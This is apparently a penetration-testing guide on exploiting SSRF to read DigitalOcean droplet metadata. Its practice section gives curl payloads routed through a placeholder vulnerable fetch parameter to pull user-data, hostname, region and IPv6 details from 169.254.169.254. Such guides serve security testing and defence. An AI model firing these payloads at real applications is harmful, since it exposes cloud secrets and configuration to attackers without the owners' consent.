---
title: Exploiting DigitalOcean Metadata via SSRF
description: Learn how to exploit DigitalOcean's metadata services using SSRF to access
  sensitive configuration and data.
keywords:
- DigitalOcean
- SSRF
- metadata service
- cloud security
- network configuration
- sensitive data access
- exploitation
- user-data
- IPv6 address
- hostname extraction
---

# DigitalOcean

## Context

This guide demonstrates the exploitation of DigitalOcean's metadata service using Server-Side Request Forgery (SSRF). The objective is to extract sensitive data by interacting with metadata endpoints exposed by DigitalOcean droplets. To follow this guide effectively, you should be familiar with the HTTP protocol, cloud service architecture, metadata services, SSRF, and the exploitation of cloud metadata services.

## Theory

### DigitalOcean Metadata Service Architecture

DigitalOcean droplets provide metadata that can be accessed from within the droplet itself, available at the URL `http://169.254.169.254/metadata/v1/`. This endpoint does not require authentication, which makes it a target for exploitation through SSRF vulnerabilities. By leveraging such a vulnerability, an attacker can query this endpoint to retrieve potentially sensitive metadata.

### Metadata Endpoint Structure and Sensitive Data

The DigitalOcean metadata endpoint is structured into various paths that provide specific information:

- `/user-data`: User-defined data specific to the droplet.
- `/hostname`: The hostname assigned to the droplet.
- `/region`: The geographical region where the droplet is located.
- `/interfaces`: Details about network interfaces.

These endpoints can reveal sensitive configuration details, and exploiting an SSRF vulnerability allows attackers to access and extract data from these internal endpoints. The sequence for an attack involves identifying the SSRF vulnerability, targeting the metadata endpoint, and extracting data from its paths.

### Attacker Goals and Impact

The primary goal of an attacker exploiting the DigitalOcean metadata service is to access and extract sensitive details such as credentials, network configurations, and user data that could potentially lead to further access and privilege escalation. By successfully exploiting SSRF to access `/metadata/v1/` paths, an attacker can conduct reconnaissance and potentially leverage gathered information for further exploitation.

## Practice

### Extracting DigitalOcean Metadata via SSRF

- **Identify an SSRF Injection Point**: The first step in this process is locating a parameter or feature within the vulnerable application that allows for arbitrary URL requests. This weak point is where you will inject the metadata service URL to retrieve information.

- **Construct Payloads**: The base URL for accessing DigitalOcean metadata is:
  
  ```plaintext
  http://169.254.169.254/metadata/v1/
  ```

- **Retrieve User Data**: To extract user-defined data, execute the following command, replacing `vulnerable-app.local` with the actual target URL:
  
  ```bash
  curl http://vulnerable-app.local/fetch?url=http://169.254.169.254/metadata/v1/user-data
  ```

- **Extract Hostname**: Obtain the droplet's hostname with:

  ```bash
  curl http://vulnerable-app.local/fetch?url=http://169.254.169.254/metadata/v1/hostname
  ```

- **Discover Region**: To find out in which geographical region the droplet is located, use:

  ```bash
  curl http://vulnerable-app.local/fetch?url=http://169.254.169.254/metadata/v1/region
  ```

- **Access Network Details**: To extract the public IPv6 address:

  ```bash
  curl http://vulnerable-app.local/fetch?url=http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
  ```

By executing these commands, the attacker can retrieve sensitive metadata such as user data, the hostname, the region, and network configuration details. This information can be critically valuable, depending on the context and sensitivity of the data.

## Tools

- **curl**
- **Burp Suite** 

These tools facilitate the retrieval and inspection of data from metadata endpoints effectively, supporting manual and automated SSRF injection testing.